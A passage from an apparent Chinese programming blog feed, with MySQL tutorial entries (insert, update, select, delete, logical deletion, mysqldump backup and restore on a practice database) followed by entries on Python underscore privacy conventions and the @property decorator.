rows in set (0.00 sec)mysql&gt; select * from class;+----+-----------------------+| id | name                  |+----+-----------------------+|  1 | Python高级开发班      |+----+-----------------------+1 row in set (0.00 sec)mysql&gt; insert into class values(2,&quot;Python入门班&quot;);Query OK, 1 row affected (0.13 sec)mysql&gt; select * from class;+----+-----------------------+| id | name                  |+----+-----------------------+|  1 | Python高级开发班      ||  2 | Python入门班          |+----+-----------------------+2 rows in set (0.00 sec)</code></pre><p>向学生表中插入学生信息.</p><p>主键字段 可以用 <strong>0</strong>  <strong>null</strong>   <strong>default</strong> 来占位</p><p><strong>枚举数据类型</strong>中的下标从1开始</p><blockquote><p>1—“男” </p></blockquote><blockquote><p>2—&gt;”女”</p></blockquote><p>insert into students values(0,”刘备”,88,”女”,1,”1999-01-01”);</p><pre><code>mysql&gt; show tables;+------------------+| Tables_in_School |+------------------+| class            || students         |+------------------+2 rows in set (0.00 sec)mysql&gt; desc students;+--------+-------------------------------------+------+-----+------------+----------------+| Field  | Type                                | Null | Key | Default    | Extra          |+--------+-------------------------------------+------+-----+------------+----------------+| id     | int(10) unsigned                    | NO   | PRI | NULL       | auto_increment || name   | varchar(30)                         | YES  |     | NULL       |                || age    | tinyint(3) unsigned                 | YES  |     | 0          |                || gender | enum(&#39;男&#39;,&#39;女&#39;,&#39;中性&#39;,&#39;保密&#39;)       | YES  |     | 保密       |                || cls_id | int(10) unsigned                    | YES  |     | NULL       |                || birth  | date                                | YES  |     | 1990-01-01 |                |+--------+-------------------------------------+------+-----+------------+----------------+6 rows in set (0.01 sec)mysql&gt; insert into students values(0,&quot;刘备&quot;,88,&quot;女&quot;,1,&quot;1999-01-01&quot;);Query OK, 1 row affected (0.08 sec)mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | 曹操   |   18 | 女     |      0 | NULL       ||  2 | 刘备   |   88 | 女     |      1 | 1999-01-01 |+----+--------+------+--------+--------+------------+2 rows in set (0.00 sec)mysql&gt; insert into students values(null,&quot;刘备&quot;,88,&quot;女&quot;,1,&quot;1999-01-01&quot;);Query OK, 1 row affected (0.07 sec)mysql&gt; insert into students values(default,&quot;刘备&quot;,88,&quot;女&quot;,1,&quot;1999-01-01&quot;);Query OK, 1 row affected (0.07 sec)mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | 曹操   |   18 | 女     |      0 | NULL       ||  2 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  3 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  4 | 刘备   |   88 | 女     |      1 | 1999-01-01 |+----+--------+------+--------+--------+------------+4 rows in set (0.00 sec)mysql&gt; insert into students values(default,&quot;刘备&quot;,88,1,1,&quot;1999-01-01&quot;);Query OK, 1 row affected (0.07 sec)mysql&gt; insert into students values(default,&quot;刘备&quot;,88,2,1,&quot;1999-01-01&quot;);Query OK, 1 row affected (0.03 sec)mysql&gt; insert into students values(default,&quot;刘备&quot;,88,3,1,&quot;1999-01-01&quot;);Query OK, 1 row affected (0.09 sec)mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | 曹操   |   18 | 女     |      0 | NULL       ||  2 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  3 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  4 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  5 | 刘备   |   88 | 男     |      1 | 1999-01-01 ||  6 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  7 | 刘备   |   88 | 中性   |      1 | 1999-01-01 |+----+--------+------+--------+--------+------------+7 rows in set (0.01 sec)</code></pre><p><strong>部分插入</strong></p><p>insert into 表名(列1,…) values(值1,…);</p><p><strong>insert into students(name,gender) values(“貂蝉”,2);</strong></p><pre><code>mysql&gt; desc students;+--------+-------------------------------------+------+-----+------------+----------------+| Field  | Type                                | Null | Key | Default    | Extra          |+--------+-------------------------------------+------+-----+------------+----------------+| id     | int(10) unsigned                    | NO   | PRI | NULL       | auto_increment || name   | varchar(30)                         | YES  |     | NULL       |                || age    | tinyint(3) unsigned                 | YES  |     | 0          |                || gender | enum(&#39;男&#39;,&#39;女&#39;,&#39;中性&#39;,&#39;保密&#39;)       | YES  |     | 保密       |                || cls_id | int(10) unsigned                    | YES  |     | NULL       |                || birth  | date                                | YES  |     | 1990-01-01 |                |+--------+-------------------------------------+------+-----+------------+----------------+6 rows in set (0.00 sec)mysql&gt; insert into students(name,gender) values(&quot;貂蝉&quot;,2);Query OK, 1 row affected (0.02 sec)mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | 曹操   |   18 | 女     |      0 | NULL       ||  2 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  3 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  4 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  5 | 刘备   |   88 | 男     |      1 | 1999-01-01 ||  6 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  7 | 刘备   |   88 | 中性   |      1 | 1999-01-01 ||  8 | 貂蝉   |    0 | 女     |   NULL | 1990-01-01 |+----+--------+------+--------+--------+------------+8 rows in set (0.00 sec)</code></pre><p><strong>多行插入</strong></p><p>insert into 表名 values(…),(…)…;</p><p>insert into students <strong>values(default,”西施”,20,2,1,”1997-7-9”),(default,”大乔”,21,2,1,”1999-7-9”)</strong>;</p><pre><code>mysql&gt; desc students;+--------+-------------------------------------+------+-----+------------+----------------+| Field  | Type                                | Null | Key | Default    | Extra          |+--------+-------------------------------------+------+-----+------------+----------------+| id     | int(10) unsigned                    | NO   | PRI | NULL       | auto_increment || name   | varchar(30)                         | YES  |     | NULL       |                || age    | tinyint(3) unsigned                 | YES  |     | 0          |                || gender | enum(&#39;男&#39;,&#39;女&#39;,&#39;中性&#39;,&#39;保密&#39;)       | YES  |     | 保密       |                || cls_id | int(10) unsigned                    | YES  |     | NULL       |                || birth  | date                                | YES  |     | 1990-01-01 |                |+--------+-------------------------------------+------+-----+------------+----------------+6 rows in set (0.00 sec)mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | 曹操   |   18 | 女     |      0 | NULL       ||  2 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  3 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  4 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  5 | 刘备   |   88 | 男     |      1 | 1999-01-01 ||  6 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  7 | 刘备   |   88 | 中性   |      1 | 1999-01-01 ||  8 | 貂蝉   |    0 | 女     |   NULL | 1990-01-01 |+----+--------+------+--------+--------+------------+8 rows in set (0.00 sec)mysql&gt; insert into students values(default,&quot;西施&quot;,20,2,1,&quot;1997-7-9&quot;),(default,&quot;大乔&quot;,21,2,1,&quot;1999-7-9&quot;);Query OK, 2 rows affected (0.05 sec)Records: 2  Duplicates: 0  Warnings: 0mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | 曹操   |   18 | 女     |      0 | NULL       ||  2 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  3 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  4 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  5 | 刘备   |   88 | 男     |      1 | 1999-01-01 ||  6 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  7 | 刘备   |   88 | 中性   |      1 | 1999-01-01 ||  8 | 貂蝉   |    0 | 女     |   NULL | 1990-01-01 ||  9 | 西施   |   20 | 女     |      1 | 1997-07-09 || 10 | 大乔   |   21 | 女     |      1 | 1999-07-09 |+----+--------+------+--------+--------+------------+10 rows in set (0.00 sec)</code></pre><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><p>语法:</p><blockquote><p>update 表名 set 列1=值1,列2=值2… where 条件</p></blockquote><p>update students set gender=1 where id = 2;</p><p>update students set name = “张三”,age = 100 where id = 2;</p><pre><code>+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | 曹操   |   18 | 女     |      0 | NULL       ||  2 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  3 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  4 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  5 | 刘备   |   88 | 男     |      1 | 1999-01-01 ||  6 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  7 | 刘备   |   88 | 中性   |      1 | 1999-01-01 ||  8 | 貂蝉   |    0 | 女     |   NULL | 1990-01-01 ||  9 | 西施   |   20 | 女     |      1 | 1997-07-09 || 10 | 大乔   |   21 | 女     |      1 | 1999-07-09 |+----+--------+------+--------+--------+------------+mysql&gt; update students set gender=1 where id = 2;Query OK, 1 row affected (0.14 sec)Rows matched: 1  Changed: 1  Warnings: 0mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | 曹操   |   18 | 女     |      0 | NULL       ||  2 | 刘备   |   88 | 男     |      1 | 1999-01-01 ||  3 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  4 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  5 | 刘备   |   88 | 男     |      1 | 1999-01-01 ||  6 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  7 | 刘备   |   88 | 中性   |      1 | 1999-01-01 ||  8 | 貂蝉   |    0 | 女     |   NULL | 1990-01-01 ||  9 | 西施   |   20 | 女     |      1 | 1997-07-09 || 10 | 大乔   |   21 | 女     |      1 | 1999-07-09 |+----+--------+------+--------+--------+------------+10 rows in set (0.00 sec)mysql&gt; update students set name = &quot;张三&quot;,age = 100 where id = 2;Query OK, 1 row affected (0.01 sec)Rows matched: 1  Changed: 1  Warnings: 0mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | 曹操   |   18 | 女     |      0 | NULL       ||  2 | 张三   |  100 | 男     |      1 | 1999-01-01 ||  3 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  4 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  5 | 刘备   |   88 | 男     |      1 | 1999-01-01 ||  6 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  7 | 刘备   |   88 | 中性   |      1 | 1999-01-01 ||  8 | 貂蝉   |    0 | 女     |   NULL | 1990-01-01 ||  9 | 西施   |   20 | 女     |      1 | 1997-07-09 || 10 | 大乔   |   21 | 女     |      1 | 1999-07-09 |+----+--------+------+--------+--------+------------+10 rows in set (0.01 sec)</code></pre><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><p><strong>查询所有列</strong></p><p>select * from 表名;</p><p>select * from students;</p><p><strong>条件查询</strong></p><p>select * from students where name = “刘备”;</p><p><strong>查询指定列</strong></p><p>select 列1,列2,… from 表名;</p><p>select name,gender from students;</p><p><strong>为列或表指定别名</strong></p><p>select name as “姓名”,gender as “性别” from students;</p><p><strong>依照字段的顺序进行查询</strong></p><p>select id as “序号”,gender as “性别”,name as “姓名”,birth as “生日” from students;</p><pre><code>mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | 曹操   |   18 | 女     |      0 | NULL       ||  2 | 张三   |  100 | 男     |      1 | 1999-01-01 ||  3 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  4 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  5 | 刘备   |   88 | 男     |      1 | 1999-01-01 ||  6 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  7 | 刘备   |   88 | 中性   |      1 | 1999-01-01 ||  8 | 貂蝉   |    0 | 女     |   NULL | 1990-01-01 ||  9 | 西施   |   20 | 女     |      1 | 1997-07-09 || 10 | 大乔   |   21 | 女     |      1 | 1999-07-09 |+----+--------+------+--------+--------+------------+10 rows in set (0.01 sec)mysql&gt; select * from students where name = &quot;刘备&quot;;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  3 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  4 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  5 | 刘备   |   88 | 男     |      1 | 1999-01-01 ||  6 | 刘备   |   88 | 女     |      1 | 1999-01-01 ||  7 | 刘备   |   88 | 中性   |      1 | 1999-01-01 |+----+--------+------+--------+--------+------------+5 rows in set (0.00 sec)mysql&gt; select name,gender from students;+--------+--------+| name   | gender |+--------+--------+| 曹操   | 女     || 张三   | 男     || 刘备   | 女     || 刘备   | 女     || 刘备   | 男     || 刘备   | 女     || 刘备   | 中性   || 貂蝉   | 女     || 西施   | 女     || 大乔   | 女     |+--------+--------+10 rows in set (0.00 sec)mysql&gt; select name as &quot;姓名&quot;,gender as &quot;性别&quot; from students;+--------+--------+| 姓名   | 性别   |+--------+--------+| 曹操   | 女     || 张三   | 男     || 刘备   | 女     || 刘备   | 女     || 刘备   | 男     || 刘备   | 女     || 刘备   | 中性   || 貂蝉   | 女     || 西施   | 女     || 大乔   | 女     |+--------+--------+10 rows in set (0.00 sec)mysql&gt; select id as &quot;序号&quot;,gender as &quot;性别&quot;,name as &quot;姓名&quot;,birth as &quot;生日&quot; from students;+--------+--------+--------+------------+| 序号   | 性别   | 姓名   | 生日       |+--------+--------+--------+------------+|      1 | 女     | 曹操   | NULL       ||      2 | 男     | 张三   | 1999-01-01 ||      3 | 女     | 刘备   | 1999-01-01 ||      4 | 女     | 刘备   | 1999-01-01 ||      5 | 男     | 刘备   | 1999-01-01 ||      6 | 女     | 刘备   | 1999-01-01 ||      7 | 中性   | 刘备   | 1999-01-01 ||      8 | 女     | 貂蝉   | 1990-01-01 ||      9 | 女     | 西施   | 1997-07-09 ||     10 | 女     | 大乔   | 1999-07-09 |+--------+--------+--------+------------+10 rows in set (0.00 sec)</code></pre><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p><strong>物理删除</strong></p><p>delete from 表名 where 条件</p><p>delete from students;        </p><blockquote><p>清空数据表中的所有数据</p></blockquote><p>delete from students where name = “刘备”;</p><blockquote><p>根据条件删除</p></blockquote><pre><code>mysql&gt; delete from students where name = &quot;刘备&quot;;Query OK, 5 rows affected (0.13 sec)mysql&gt; select * from students;+----+--------+------+--------+--------+------------+| id | name   | age  | gender | cls_id | birth      |+----+--------+------+--------+--------+------------+|  1 | 曹操   |   18 | 女     |      0 | NULL       ||  2 | 张三   |  100 | 男     |      1 | 1999-01-01 ||  8 | 貂蝉   |    0 | 女     |   NULL | 1990-01-01 ||  9 | 西施   |   20 | 女     |      1 | 1997-07-09 || 10 | 大乔   |   21 | 女     |      1 | 1999-07-09 |+----+--------+------+--------+--------+------------+5 rows in set (0.00 sec)</code></pre><p><strong>逻辑删除</strong></p><p>用一个字段表示这条数据已经被删除</p><p>给数据表(students)添加一个字段is_delete数据类型为bit类型,1为删除,0为未删除</p><p>alter table students add is_delete bit default 0;</p><p>update students set is_delete = 1 where id = 1;</p><pre><code>mysql&gt; alter table students add is_delete bit default 0;Query OK, 0 rows affected (0.10 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; select * from students;+----+--------+------+--------+--------+------------+-----------+| id | name   | age  | gender | cls_id | birth      | is_delete |+----+--------+------+--------+--------+------------+-----------+|  1 | 曹操   |   18 | 女     |      0 | NULL       |           ||  2 | 张三   |  100 | 男     |      1 | 1999-01-01 |           ||  8 | 貂蝉   |    0 | 女     |   NULL | 1990-01-01 |           ||  9 | 西施   |   20 | 女     |      1 | 1997-07-09 |           || 10 | 大乔   |   21 | 女     |      1 | 1999-07-09 |           |+----+--------+------+--------+--------+------------+-----------+5 rows in set (0.00 sec)mysql&gt; update students set is_delete = 1 where id = 1;Query OK, 1 row affected (0.09 sec)Rows matched: 1  Changed: 1  Warnings: 0mysql&gt; select * from students;+----+--------+------+--------+--------+------------+-----------+| id | name   | age  | gender | cls_id | birth      | is_delete |+----+--------+------+--------+--------+------------+-----------+|  1 | 曹操   |   18 | 女     |      0 | NULL       | ☺         ||  2 | 张三   |  100 | 男     |      1 | 1999-01-01 |           ||  8 | 貂蝉   |    0 | 女     |   NULL | 1990-01-01 |           ||  9 | 西施   |   20 | 女     |      1 | 1997-07-09 |           || 10 | 大乔   |   21 | 女     |      1 | 1999-07-09 |           |+----+--------+------+--------+--------+------------+-----------+5 rows in set (0.00 sec)</code></pre><h1 id="Mysql数据库的备份"><a href="#Mysql数据库的备份" class="headerlink" title="Mysql数据库的备份"></a>Mysql数据库的备份</h1><h2 id="备份数据库"><a href="#备份数据库" class="headerlink" title="备份数据库"></a>备份数据库</h2><p>mysqldump -u root 数据库名 &gt; test.sql;</p><pre><code>[chen@bogon ~]$ mysqldump -u root -p  School &gt; test.sql;Enter password:[chen@bogon ~]$ lstest.sql  公  模  视  图  文  下  音  桌[chen@bogon ~]$ mysql -u root -pEnter password:Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 19Server version: 8.0.13 MySQL Community Server - GPLCopyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database           |+--------------------+| School             || information_schema || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.00 sec)mysql&gt; drop database School;Query OK, 2 rows affected (0.14 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                |+--------------------+4 rows in set (0.00 sec)mysql&gt; exitBye</code></pre><h2 id="恢复备份"><a href="#恢复备份" class="headerlink" title="恢复备份"></a>恢复备份</h2><ol><li>连接mysql，创建新的数据库</li><li>退出连接执行下列命令</li></ol><p>mysql -u root -p 新数据库名字(刚刚创建的) &lt; test.sql</p><pre><code>[chen@bogon ~]$ mysql -u root -pEnter password:Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 20Server version: 8.0.13 MySQL Community Server - GPLCopyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.mysql&gt; create database School;Query OK, 1 row affected (0.66 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| School             || information_schema || mysql              || performance_schema || sys                |+--------------------+5 rows in set (0.00 sec)mysql&gt; exitBye[chen@bogon ~]$ mysql -u root -p School &lt; test.sqlEnter password:[chen@bogon ~]$ mysql -u root -pEnter password:Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 22Server version: 8.0.13 MySQL Community Server - GPLCopyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.mysql&gt; use School;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+------------------+| Tables_in_School |+------------------+| class            || students         |+------------------+2 rows in set (0.00 sec)mysql&gt; select * from students;+----+--------+------+--------+--------+------------+-----------+| id | name   | age  | gender | cls_id | birth      | is_delete |+----+--------+------+--------+--------+------------+-----------+|  1 | 曹操   |   18 | 女     |      0 | NULL       | ☺         ||  2 | 张三   |  100 | 男     |      1 | 1999-01-01 |           ||  8 | 貂蝉   |    0 | 女     |   NULL | 1990-01-01 |           ||  9 | 西施   |   20 | 女     |      1 | 1997-07-09 |           || 10 | 大乔   |   21 | 女     |      1 | 1999-07-09 |           |+----+--------+------+--------+--------+------------+-----------+5 rows in set (0.00 sec)</code></pre><h1 id="特别提醒"><a href="#特别提醒" class="headerlink" title="特别提醒"></a>特别提醒</h1><p><strong>MysqlSQL中的注释使用双横线  - -  </strong></p><p><strong>mysql命令行不区分大小写,但是语法一般都要大写.</strong></p><p><strong>忘记Delete和Drop命令吧,数据一删,牢底坐穿</strong></p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python私有化</title>
      <link href="/2018/11/18/python-si-you-hua/"/>
      <url>/2018/11/18/python-si-you-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><ul><li>variable: 公有变量</li><li>_variable: 单前置下划线,私有化属性或方法，from somemodule import *禁止导入,类对象和子类可以访问</li><li>__variable：双前置下划线,避免与子类中的属性命名冲突，无法在外部直接访问(名字重整所以访问不到)</li><li><strong>variable</strong>:双前后下划线,用户<strong>名字空间的魔法对象或属性</strong>。例如:<strong>init</strong> , __ <strong>不要自己发明这样的名字</strong></li><li>xx_:单后置下划线,<strong>用于避免与Python关键词的冲突</strong></li></ul><h1 id="实例引入"><a href="#实例引入" class="headerlink" title="实例引入"></a>实例引入</h1><pre><code>__author__ = &#39;Chen&#39;__date__ = &#39;2018/11/13 22:37&#39;class Person(object):    def __init__(self, name, age, teste):        self.name = name  # 公有变量        self._age = age  # 私有变量，函数，方法和类,from somemodule import * 禁止导入,类对象和子类可以访问        self.__teste = teste  # 避免与子类中的属性命名冲突,无法直接在外部访问    def showPeron(self):        print(self.name)        print(self._age)        print(self.__teste)    def _work(self):        # 私有方法        print(&quot;私有方法&quot;)    def __away(self):        # 避免与子类中的方法命名冲突,无法在外部访问        print(&quot;away&quot;)    def doWork(self):        self._work()        self.__away()class Student(Person):    # 继承Peron    def construction(self, name, age, teste):        # 构造方法        self.name = name        self._age = age        self.__teste = teste    def showStudent(self):        print(self.name)        print(self._age)        print(self.__teste)    @staticmethod  # 静态方法无权访问cls或self。它们像常规函数一样工作，但属于类的命名空间。    def testbug():        _Bug.showbug()class _Bug(object):    @staticmethod    def showbug():        print(&quot;showBug&quot;)if __name__ == &#39;__main__&#39;:    s1 = Student(&quot;Chen&quot;, 25, &quot;Like&quot;)  # 实例化对象    s1.showPeron()  # 调用方法    # s1.showStudent()    # __teste:双重前导下划线应该仅用于避免与设计为子类的类中的属性发生名称冲突。    s1.construction(&quot;曹操&quot;, 88, &quot;Test&quot;)    s1.showStudent()    Student.testbug()  # Student类的中的testbug()方法调用私有类_Bug中的showbug()方法</code></pre><p><strong>总结</strong>:</p><ul><li>父类中属性以<strong>__(双下划线)</strong>开头的变量名,<strong>子类不能继承,也不能访问</strong></li><li>如果在子类中向__(双下划线)开头的变量名赋值,那么会在子类中定义的一个与父类相同名字的属性.</li><li>_(单下划线)的变量,函数,类在使用from xxx import * 时不会被导入</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PythonProperty属性</title>
      <link href="/2018/11/15/property-shu-xing/"/>
      <url>/2018/11/15/property-shu-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是property属性"><a href="#什么是property属性" class="headerlink" title="什么是property属性"></a>什么是property属性</h1><p>在许多面向对象的编程语言中(Java)使用getter和setter来确保数据封装。它们也被称为mutator方法。<br>这些方法当然是用于获取数据的getter和用于更改数据的setter。根据这个原则，类的属性是私有的，以隐藏和保护它们免受其他代码的影响</p><blockquote><p>mutator方法:改变对象属性的方法</p></blockquote><p>简单来说就是用起来像是使用的实例属性一样的<strong>特殊属性</strong>，可以<strong>对应于某个方法</strong></p><pre><code># ############### 定义 ###############class Pager:    def __init__(self, current_page):        # 用户当前请求的页码（第一页、第二页...）        self.current_page = current_page        # 每页默认显示10条数据        self.per_items = 10     @property    def start(self):        val = (self.current_page - 1) * self.per_items        return val    @property    def end(self):        val = self.current_page * self.per_items        return val# ############### 调用 ###############p = Pager(1)print(p.start)  # 就是起始值，即：mprint(p.end)  # 就是结束值，即：n</code></pre><h2 id="Property定义时注意"><a href="#Property定义时注意" class="headerlink" title="Property定义时注意:"></a>Property定义时注意:</h2><p>定义时,在<strong>实例方法</strong>的基础上添加<strong>@property装饰器</strong>,并且<strong>实力方法仅有一个self参数</strong></p><pre><code># ############### 定义 ###############class Goods():    @property    def test(self):        return 100# ############### 调用 ###############a = Goods()num = a.testprint(num)</code></pre><p><strong>调用时无需使用括号</strong></p><p>调用方法：foo_obj.func()</p><p>调用property属性：foo_obj.prop</p><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><pre><code>class Pager:    def __init__(self, current_page):        self.current_page = current_page        self.per_items = 10     @property    def start(self):        val = (self.current_page - 1) * self.per_items        return val    @property    def end(self):        val = self.current_page * self.per_items        return valp = Pager(2)p.start  p.end</code></pre><p>在这里的property属性的功能：property属性内部进行一系列的逻辑计算，最终将计算结果返回。</p><h1 id="定义Property属性的两种方式"><a href="#定义Property属性的两种方式" class="headerlink" title="定义Property属性的两种方式"></a>定义Property属性的两种方式</h1><ol><li>装饰器方式:在类的实例方法上添加@property装饰器</li><li>类属性方式:在类定义时定义值为property对象的类属性</li></ol><h2 id="新式类中定义装饰器的方式"><a href="#新式类中定义装饰器的方式" class="headerlink" title="新式类中定义装饰器的方式"></a>新式类中定义装饰器的方式</h2><pre><code>#coding=utf-8class Goods:    @property    def price(self):        print(&#39;@property&#39;)    @price.setter    def price(self, value):        print(&#39;@price.setter&#39;)    @price.deleter    def price(self):        print(&#39;@price.deleter&#39;)obj = Goods()obj.price          # 自动执行 @property 修饰的price方法，并获取方法的返回值obj.price = 123    # 自动执行 @price.setter 修饰的 price 方法，并将  123 赋值给方法的参数del obj.price      # 自动执行 @price.deleter 修饰的 price 方法</code></pre><p><strong>新式类中Property属性的三种访问方式对应了三个被@property,@方法名.setter,@方法名.deleter修饰的方法.由于新式类中有三种访问方式,我们可以根据他们三个的访问特点,分别将三个方法定义为对同一个属性的获取,修改,删除</strong></p><blockquote><p>新式类:如果类继承了object，那么该类是新式类</p></blockquote><p>另一个Demo</p><pre><code>class Goods(object):    def __init__(self):        # 原价        self.original_price = 100        # 折扣        self.discount = 0.8    @property    def price(self):        # 实际价格 = 原价 * 折扣        new_price = self.original_price * self.discount        return new_price    @price.setter    def price(self, value):        self.original_price = value    @price.deleter    def price(self):        del self.original_priceobj = Goods()obj.price         # 获取商品价格obj.price = 200   # 修改商品原价del obj.price     # 删除商品原价</code></pre><h2 id="类属性方式"><a href="#类属性方式" class="headerlink" title="类属性方式"></a>类属性方式</h2><pre><code>&quot;&quot;&quot;property方法中有个四个参数    第一个参数是方法名，调用 对象.属性 时自动触发执行方法    第二个参数是方法名，调用 对象.属性 ＝ XXX 时自动触发执行方法    第三个参数是方法名，调用 del 对象.属性 时自动触发执行方法    第四个参数是字符串，调用 对象.属性.__doc__ ，此参数是该属性的描述信息&quot;&quot;&quot;class Goods(object):    def __init__(self):        # 原价        self.original_price = 100        # 折扣        self.discount = 0.8    def get_price(self):        # 实际价格 = 原价 * 折扣        new_price = self.original_price * self.discount        return new_price    def set_price(self, value):        &quot;&quot;&quot;必须两个参数&quot;&quot;&quot;        self.original_price = value    def del_price(self):        del self.original_price    PRICES = property(get_price, set_price, del_price, &quot;description...&quot;)  # 创建值为property对象的类属性obj = Goods()obj.PRICES  # 自动调用第一个参数中定义的方法：get_barprint(obj.PRICES)obj.PRICES = 200  # 自动调用第二个参数中定义的方法：set_bar方法，并将“alex”当作参数传入print(obj.PRICES)desc = Goods.PRICES.__doc__  # 自动获取第四个参数中设置的值：description...print(desc)del obj.PRICES  # 自动调用第三个参数中定义的方法：del_bar方法</code></pre><p><strong>由于使用类属性方式创建property属性具有3种访问方式，我们可以根据它们几个属性的访问特点，分别将三个方法定义为对同一个属性：获取、修改、删除</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python中的深拷贝和浅拷贝</title>
      <link href="/2018/11/14/python-zhong-de-shen-kao-bei-he-qian-kao-bei/"/>
      <url>/2018/11/14/python-zhong-de-shen-kao-bei-he-qian-kao-bei/</url>
      
